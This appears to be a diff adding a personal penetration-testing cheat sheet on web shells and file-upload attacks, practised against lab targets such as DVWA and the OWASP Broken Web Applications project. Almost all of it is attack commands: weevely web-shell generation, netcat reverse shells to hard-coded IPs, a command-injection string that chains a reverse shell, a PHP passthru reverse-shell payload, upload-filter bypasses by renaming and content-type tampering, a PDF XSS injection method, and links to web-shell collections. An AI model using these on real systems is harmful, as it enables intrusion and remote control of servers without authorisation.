@@ -1,0 +1,46 @@
+#weevely tool
+weevely generate 123456 /root/shell.php
+weevely http://192.168.1.1/dvwa/hackable/upload/shell.php 123456
+
+#netcat
+nc -e /bin/sh 192.168.1.1 8080
+command injection to RCE = 127.0.0.2; nc -e /bin/sh 192.168.0.110 8080
+nc -vv -l -p 8080
+
+#remote file upload/file inclusion
+<?php>
+passthru('nc -e /bin/bash 192.168.0.110 8080')
+?>
+save file /var/www/html/reverse.txt = start apache server
+
+#to pdf file 
+ext:pdf site:*.co.in (.com,.edu.org)
+https://github.com/cornerpirate/JS2PDFInjector (pdf to js injector)
+vim test.js (inject xss payload)
+pwd (for path)
+java -jar js2pdfinjector-1.0.jar /home/kali/pdfs/testing.pdf /home/kali/pdfs/test.js
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/README.md 
+
+
+dvwa
+low = img / php
+change ip and port = use gedit for php-reverse-shell
+nc -nvlp 4444
+
+medium
+mv php-reverse-shell.php php-reverse-shell.php.jpg 
+
+#owasp broken web application project 
+1)upload file
+2)use burp suit = change contant type 
+3)change extension and path = image/jpeg
+
+
+https://sourceforge.net/projects/owaspbwa/files/latest/download
+https://github.com/xl7dev/WebShell
+https://github.com/TheBinitGhimire/Web-Shells
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+https://github.com/x-o-r-r-o/PHP-Webshells-Collection
+https://github.com/topics/web-shell
+https://github.com/fuzzdb-project/fuzzdb (important)
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
